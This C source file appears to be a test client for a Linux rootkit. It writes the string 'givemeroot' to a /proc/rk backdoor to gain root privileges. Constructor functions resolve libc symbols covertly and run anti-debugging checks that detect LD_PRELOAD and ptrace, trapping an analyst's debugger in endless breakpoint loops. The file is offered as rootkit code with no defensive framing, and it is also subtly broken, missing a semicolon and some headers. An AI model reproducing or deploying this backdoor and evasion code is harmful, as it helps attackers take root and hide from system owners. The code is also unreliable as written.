#define _GNU_SOURCE

#include <stdint.h>
#include <signal.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <sys/ptrace.h>

#include "include/config.h"
#include "include/common.h"
#include "include/dlsym.h"
#include "include/misc.h"

extern char **environ;
extern void *(*real_dlsym)(void *handle, const char *name);

void *libc;

static int rk_exec(const char *file, const char *cmd)
{
    int fd;

    if((fd = open(file, O_WRONLY)) < 0)
        return 1;

    write(fd, cmd, strlen(cmd));
    close(fd)

    return 0;
}

int main(void)
{
    int fd, uid, orig_uid, orig_gid;

    printf("Normal Operation!\r\n");

    orig_uid = getuid();
    orig_gid = getgid();

    if(orig_uid > 0)
        printf("Not Root!\r\n");

    rk_exec("/proc/rk", "givemeroot");

    uid = getuid();

    if(uid == 0) // TODO: Root priveledged stuff
        printf("Are Root!\r\n");
    else if(uid == orig_uid)
        printf("Still Not Root!\r\n");

    setuid(orig_uid);
    setgid(orig_gid);

    uid = getuid();

    if(uid != orig_uid || uid == 0)
        printf("Still Root, uid: %d\r\n", uid);
    else if(uid == orig_uid)
        printf("We're not root anymore, uid: %d\r\n", uid);

    return 0;
}

__attribute__((constructor (101))) void init(void)
{
    libc = dlopen(LIBC_PATH, RTLD_LAZY);

    if(!real_dlsym)
        find_dlsym();
}

__attribute__((constructor (102))) void anti_tricks(void)
{
    int i;
    volatile int pt_offset = 0;
    char env[] = "LD_PRELOAD";

    signal(SIGTRAP, NULL);

    for(i = 0; environ[i]; i++)
    {
        int ii;
        for(ii = 0; env[ii] != '\0' && environ[i][ii] != '\0'; ii++)
        {
            if(env[ii] != environ[i][ii])
                break;
        }

        if(env[ii] == '\0')
        {
            do
            {
                __asm__("   \
                    int3    \
                ");
            } while(1);

            return;
        }
    }

    if(ptrace(PTRACE_TRACEME, 0, 1, 0) == 0)
    {
        pt_offset = 7331;
    }

    if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
    {
        if(pt_offset != 7331)
        {
            do
            {
                __asm__("   \
                    int3    \
                ");
            } while(1);
        }
        else
            pt_offset = (pt_offset * 1337);
    }

    if(pt_offset != (7331 * 1337))
    {
        do
        {
            __asm__("   \
                int3    \
            ");
        } while(1);
    }
}
